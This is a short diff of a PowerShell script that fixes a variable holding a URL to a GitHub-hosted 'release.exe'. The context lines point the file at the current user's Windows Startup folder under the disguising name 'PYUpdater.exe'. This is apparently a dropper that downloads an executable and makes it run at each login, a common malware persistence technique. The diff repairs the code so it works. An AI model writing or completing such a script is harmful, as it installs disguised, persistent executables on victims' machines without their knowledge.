@@ -37,7 +37,7 @@ if ($process) {
     Write-Host ""
 }
 
-url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
+$url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $fn = "PYUpdater.exe"
 $fp = Join-Path -Path $dest -ChildPath $fn
